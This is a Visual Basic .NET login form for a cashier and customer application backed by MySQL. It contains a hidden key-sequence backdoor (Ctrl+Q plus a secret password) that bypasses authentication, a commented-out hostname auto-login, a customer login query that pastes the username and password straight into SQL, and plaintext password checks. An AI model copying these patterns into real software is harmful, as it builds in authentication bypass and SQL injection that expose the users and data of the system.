Imports DevExpress.XtraEditors
Imports System.Data.Common
Imports System.IO
Imports MySql.Data.MySqlClient

Public Class Login
    Private ProgrammerName As String
    Private BackDoorLoginCaptureEnabled As Boolean
    Private BackDoorLoginInput As String

    Private Const CS_DROPSHADOW As Integer = 131072


    Public Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.
        HeaderPanel.BackColor = Colors.black

    End Sub

    Protected Overrides ReadOnly Property CreateParams() As System.Windows.Forms.CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            cp.ClassStyle = cp.ClassStyle Or CS_DROPSHADOW
            Return cp
        End Get
    End Property

    Private Sub Login_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        SaveSetting(AppExeName, "Default Settings", "CurrentUser", txtUsername.Text)
    End Sub

    Private Sub Login_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        Select Case True
            Case e.Control AndAlso e.KeyCode = Keys.Q
                BackDoorLoginInput = ""
                BackDoorLoginCaptureEnabled = True
                UserName = "BACKDOOR"

            Case e.KeyCode = Keys.Enter
                If BackDoorLoginCaptureEnabled Then
                    If BackDoorLoginInput.ToLower = BackDoorPass.ToLower Then
                        Dim vUser As User = New User("BACKDOOR", Nothing)
                        Project.Instance.ActiveUser = vUser
                        Project.Instance.ActiveAccountType = "Backdoor"
                        UserName = "BACKDOOR"

                        MsgBox("Back door access granted...", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")
                        Me.Close()
                        AppMainForm.LoginVerified = True
                    Else
                        BackDoorLoginCaptureEnabled = False
                        UserName = "USER"
                        BackDoorLoginInput = ""
                    End If
                Else
                    ValidateLogin()
                End If
            Case Else
                If BackDoorLoginCaptureEnabled Then
                    BackDoorLoginInput &= ChrW(e.KeyCode)
                    e.SuppressKeyPress = True
                End If
        End Select


        SaveSetting(AppExeName, "Default Settings", "CurrentUser", txtUsername.Text)
    End Sub

    Private Sub Login_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Dim loginImgFileName As String = ""
        BackDoorLoginCaptureEnabled = False

        txtUsername.Focus()

        With Project.Instance
            System.Threading.Thread.Sleep(100)
            If GetSetting(AppExeName, "Default Settings", "CurrentUser") <> "" AndAlso GetSetting(AppExeName, "Default Settings", "CurrentUser") <> "BACKDOOR" Then _
                txtUsername.Text = GetSetting(AppExeName, "Default Settings", "CurrentUser")
        End With

        'ProgrammerName = System.Net.Dns.GetHostName
        'If UCase(ProgrammerName) = "ACCESSSOFT-KENT" Then
        '    Dim vUser As User = New User("BACKDOOR", Nothing)
        '    Project.Instance.ActiveUser = vUser
        '    AppMainForm.LoginVerified = True
        '    Me.Close()
        'End If
    End Sub

    Private Sub ValidateLogin()
        Try

            Dim dtSecurity As New DataTable
            Dim daSecurity As DbDataAdapter
            Dim connSecurity As DbConnection
            If InputValidator.Validate() Then
                Dim SelectUser As String
                SelectUser = "Select PK_Usr,UserName_Usr,AccountType_Usr,Name_Usr,Picture_Usr " &
                            "FROM users " &
                            "WHERE UserName_Usr= @Name AND Password_Usr=@Password "

                connSecurity = New MySqlConnection() ''DBFactory.GetConnection(AppData.DBProvider)
                connSecurity.ConnectionString = AppData.ConnectionString

                daSecurity = New MySqlDataAdapter() ''DBFactory.GetDataAdapter(AppData.DBProvider)
                daSecurity.SelectCommand = New MySqlCommand() ''DBFactory.GetCommand(AppData.DBProvider)

                With daSecurity.SelectCommand
                    .CommandType = CommandType.Text
                    .CommandText = SelectUser
                    .Connection = connSecurity

                    Dim p As DbParameter = .CreateParameter
                    p.ParameterName = "@Name"
                    p.Value = Me.txtUsername.Text.ToLower

                    .Parameters.Add(p)

                    p = .CreateParameter
                    p.ParameterName = "@Password"
                    p.Value = Me.txtPassword.Text

                    'p = .CreateParameter
                    'p.ParameterName = "@Company"
                    'p.Value = Project.Instance.CompanyGroup

                    .Parameters.Add(p)
                End With

                daSecurity.Fill(dtSecurity)
                If dtSecurity.Rows.Count > 0 Then
                    Dim vUser As User = New User(dtSecurity.Rows(0)("Name_Usr").ToString, dtSecurity)
                    Project.Instance.ActiveUser = vUser
                    Project.Instance.ActiveUserId = dtSecurity.Rows(0)("UserName_Usr").ToString
                    Project.Instance.ActiveUserPK = dtSecurity.Rows(0)("PK_Usr").ToString
                    Project.Instance.ActiveAccountType = dtSecurity.Rows(0)("AccountType_Usr").ToString


                    With Project.Instance
                        AppMainForm.Text = .CompanyName
                    End With

                    If Project.Instance.ActiveAccountType = "Cashier" Then
                        ''Check Cashier Session
                        Dim sessionID = GetSysPK()
                        Dim date_p As DateTime = Now
                        Dim sql As String = String.Format("Select * from cashier_sessions where Date_CSession = '{0}' AND MachineName_CSession = '{1}' AND IsSessionEnded_CSession = '{2}'", date_p.ToString("yyyy-MM-dd"), Environment.MachineName, 0)
                        Dim dt As DataTable = AppData.GetDataTable(sql)
                        If dt.Rows.Count > 0 Then
                            If dt.Rows(0)("FK_Usr_CSession") <> Project.Instance.ActiveUserPK Then
                                If XtraMessageBox.Show("There a shift that didn't end by the other cashier. Do you want to end it and start a new shift?", "Confirm New", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = System.Windows.Forms.DialogResult.Yes Then
                                    Dim sqlEnd As String = String.Format("Update cashier_sessions set IsSessionEnded_CSession = '1' where pk_csession = '{0}'", dt.Rows(0)("PK_CSession"))
                                    AppData.ExecuteNonQuery(sqlEnd)

                                    Dim sqlInsert As String = String.Format("Insert Into cashier_sessions (PK_CSession,FK_Usr_CSession,Date_CSession,MachineName_CSession,IsSessionEnded_CSession) VALUES('{0}','{1}','{2}','{3}','{4}')", sessionID, Project.Instance.ActiveUserPK, date_p.ToString("yyyy-MM-dd"), Environment.MachineName, 0)
                                    AppData.ExecuteNonQuery(sqlInsert)

                                    Project.Instance.SessionId = sessionID
                                    Me.Close()
                                    Dim oform As New CashBeginning
                                    oform.HeaderLabel.Text = "CASH BEGINNING"
                                    If oform.ShowDialog() = System.Windows.Forms.DialogResult.OK Then

                                    End If
                                Else
                                    Exit Sub
                                End If
                            Else
                                Project.Instance.SessionId = dt.Rows(0)("PK_CSession")
                                Me.Close()
                            End If
                        Else
                            Dim sqlInsert As String = String.Format("Insert Into cashier_sessions (PK_CSession,FK_Usr_CSession,Date_CSession,MachineName_CSession,IsSessionEnded_CSession) VALUES('{0}','{1}','{2}','{3}','{4}')", sessionID, Project.Instance.ActiveUserPK, date_p.ToString("yyyy-MM-dd"), Environment.MachineName, 0)
                            AppData.ExecuteNonQuery(sqlInsert)
                            Project.Instance.SessionId = sessionID
                            Me.Close()
                            Dim oform As New CashBeginning
                            oform.HeaderLabel.Text = "CASH BEGINNING"
                            If oform.ShowDialog() = System.Windows.Forms.DialogResult.OK Then

                            End If
                        End If
                    End If

                    AppMainForm.LoginVerified = True
                    Me.Close()
                Else
                    Dim sqlCust As String = String.Format("Select * from universal_masters where Username_UM = '{0}' AND Password_UM = '{1}' AND Module_UM ='Customer'", txtUsername.Text, txtPassword.Text)
                    Dim dtCust As DataTable = AppData.GetDataTable(sqlCust)

                    If dtCust.Rows.Count > 0 Then
                        Dim status = IIf(IsDBNull(dtCust.Rows(0)("Status_UM")), "Active", dtCust.Rows(0)("Status_UM").ToString)

                        If status = "Active" Then
                            Dim vUser As User = New User(dtCust.Rows(0)("Name_UM").ToString, dtSecurity)
                            Project.Instance.ActiveUser = vUser
                            Project.Instance.ActiveUserId = dtCust.Rows(0)("Username_UM").ToString
                            Project.Instance.ActiveUserPK = dtCust.Rows(0)("PK_UM").ToString
                            Project.Instance.ActiveAccountType = "Customer"

                            With Project.Instance
                                AppMainForm.Text = .CompanyName
                            End With

                            AppMainForm.LoginVerified = True
                            Me.Close()
                        Else
                            MsgBox("Your account must be blocked by the admin.", MsgBoxStyle.Exclamation + MsgBoxStyle.OkOnly, "Login Error")
                        End If
                    Else
                        MsgBox("Login error: either username/password is wrong or user has no permissions...", MsgBoxStyle.Exclamation + MsgBoxStyle.OkOnly, "Login Error")
                    End If
                End If

            End If

            'MsgBox("all inputs are valid...")


        Catch ex As Exception

        End Try
    End Sub

    Private Sub btnLogin_KeyUp(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            ValidateLogin()
        End If
    End Sub



    Private Sub btnConnection_Click_1(sender As Object, e As EventArgs) Handles btnConnection.Click
        Dim dbsettings As New DatabaseConnection
        dbsettings.ShowDialog()
    End Sub



    Private Sub btnLog_In_Click(sender As Object, e As EventArgs) Handles btnLog_In.Click
        ValidateLogin()
    End Sub

    Private Sub btn_Clear_Click(sender As Object, e As EventArgs) Handles btn_Clear.Click
        txtUsername.Text = ""
        txtPassword.Text = ""
    End Sub

Private Sub lblCreate_Click(sender As Object, e As EventArgs) Handles lblCreate.Click
        Try
            Dim oform As New CustomerSetup
            Me.Hide() ' Hide the Login form
            If oform.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
                ' Code to handle the OK result if needed
            End If
            Me.Show() ' Show the Login form again
        Catch ex As Exception
            ' Code to handle exceptions if needed
        End Try
    End Sub

    Private Sub chkCheck_CheckedChanged(sender As Object, e As EventArgs) Handles chkCheck.CheckedChanged
        If chkCheck.Checked Then
            ' Show the password
            txtPassword.Properties.PasswordChar = New Char()
        Else
            ' Hide the password
            txtPassword.Properties.PasswordChar = "*"
        End If
    End Sub
    Private Sub lblCreate_MouseEnter(sender As Object, e As EventArgs) Handles lblCreate.MouseEnter
        lblCreate.ForeColor = Color.Blue
    End Sub

    Private Sub lblForgotPassword_MouseEnter(sender As Object, e As EventArgs) Handles lblCreate.MouseEnter
        lblForgotPassword.ForeColor = Color.Blue
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click

    End Sub

    Private Sub lblForgotPassword_Click(sender As Object, e As EventArgs) Handles lblForgotPassword.Click
        Try
            Dim ForgotPassForm As New frmForgotPassword
            Me.Hide() ' Hide the Login form
            If ForgotPassForm.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
                ' Code to handle the OK result if needed
            End If
            Me.Show() ' Show the Login form again
        Catch ex As Exception
            ' Code to handle exceptions if needed
        End Try
    End Sub

End Class
